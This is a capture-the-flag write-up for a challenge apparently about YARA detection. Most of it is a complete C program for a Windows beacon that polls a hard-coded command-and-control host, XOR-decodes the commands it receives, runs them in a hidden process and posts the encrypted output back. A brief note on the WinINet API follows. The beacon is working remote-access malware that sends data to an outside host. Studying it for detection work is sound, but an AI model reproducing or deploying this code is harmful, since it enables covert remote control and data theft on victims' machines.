# YARA Verificator Writeup

## Overview 
[image](/src/renamed.png)

## Idea

The general idea of this code is to mimic a type of attack. 

```C
#include <windows.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")

#define C2_SERVER "cartoonnetwork.com:1888"
#define BEACON_INTERVAL 14005
#define XOR_KEY 0x83

void xor_encrypt_decrypt(char* data, size_t length) {
	for (size_t i = 0; i < length; i++) {
		data[i] ^= XOR_KEY;
	}
}

void SendResultToServer(const char* result) {
	size_t result_len = lstrlenA(result); //copy result to buffer
	char* encrypted = (char*)malloc(result_len + 1);
	lstrcpyA(encrypted, result);

	xor_encrypt_decrypt(encrypted, result_len); //encrypt

	HINTERNET hInternet = InternetOpen("Mozilla/4.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

	if (!hInternet) {
		free(encrypted);
		return;
	}
	HINTERNET hConnect = InternetConnect(hInternet, "cartoonnetwork.com", 1888, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);

	if (!hConnect) {
		InternetCloseHandle(hInternet);
		free(encrypted);
		return;
	}

	HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", "/result", NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);

	if (hRequest) {
		HttpSendRequest(hRequest, NULL, 0, (LPVOID)encrypted, result_len);
		InternetCloseHandle(hRequest);
	}

	InternetCloseHandle(hConnect);
	InternetCloseHandle(hInternet);
	free(encrypted);
}

void ExecuteCommand(char* cmd) {
	// use CreateProcess to run command, send output back to server

	SECURITY_ATTRIBUTES sa;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = TRUE; //allow child process to inherit write handle
	sa.lpSecurityDescriptor = NULL;

	HANDLE hStdoutRead, hStdoutWrite;

	if (!CreatePipe(&hStdoutRead, &hStdoutWrite, &sa, 0)) {
		/*printf("CreatePipe failed");*/
		return;
	}

	SetHandleInformation(hStdoutRead, HANDLE_FLAG_INHERIT, 0); // read handle is not inherited

	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(STARTUPINFO));

	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.hStdOutput = hStdoutWrite;
	si.wShowWindow = SW_HIDE; //hide console window


	char cmdLine[4096];
	/*snprintf(cmdLine, sizeof(cmdLine), "cmd.exe /c %s", cmd);*/
	lstrcpyA(cmdLine, "notepad.exe /c ");
	lstrcatA(cmdLine, cmd);

	if (!CreateProcess(NULL, cmdLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
		CloseHandle(hStdoutRead);
		CloseHandle(hStdoutWrite);
		/*printf("CreateProcess failed\n");*/
		return;
	}

	CloseHandle(hStdoutWrite); //close write handle in parent because child has its own copy

	char buffer[4096];
	char output[65536] = { 0 };
	DWORD bytesRead;
	size_t totalLength = 0;

	while (ReadFile(hStdoutRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
		buffer[bytesRead] = '\0';
		if (totalLength + bytesRead < sizeof(output) - 1) {
			/*strncat_s(output, sizeof(output), buffer, _TRUNCATE);
			totalLength += bytesRead;*/
			for (DWORD i = 0; i < bytesRead && totalLength < sizeof(output) - 1; i++) {
				output[totalLength++] = buffer[i];
			}
			output[totalLength] = '\0';
		}
	}

	WaitForSingleObject(pi.hProcess, INFINITE); // wait process to finish

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	CloseHandle(hStdoutRead);

	SendResultToServer(output);

}

void Beacon() {

	while (1) {
		HINTERNET hInternet = InternetOpen("Mozilla/4.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

		if (hInternet) {
			char url[256];
			/*snprintf(url, sizeof(url), "%s/poll", C2_SERVER);*/
			lstrcpy(url, C2_SERVER);
			lstrcat(url, "/poll");
			HINTERNET hConnect = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
			if (hConnect) {
				char buffer[4096];
				DWORD bytesRead;


				if (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
					buffer[bytesRead] = '\0';

					xor_encrypt_decrypt(buffer, bytesRead);
					ExecuteCommand(buffer);
				}

				InternetCloseHandle(hConnect);
			}
			InternetCloseHandle(hInternet);
		}
		Sleep(BEACON_INTERVAL);
	}
}

int main(void) {
	Beacon();
	return 0;
}


//startup info to define stdin, stdout, stderr
```

## what is winapi? 

### wininet?
WinINet API is one of the APIs under the Networking and Internet categories in the WinAPI.

Let's look at the instructions of the challenge again: `the malware disguised itself as a legitimate browser by mimicking common web traffic patterns`. This should indicate something. One of the hints linked to WinINet documentation. 

Basically, `InternetOpen` establishes the Internet connection to the client application.



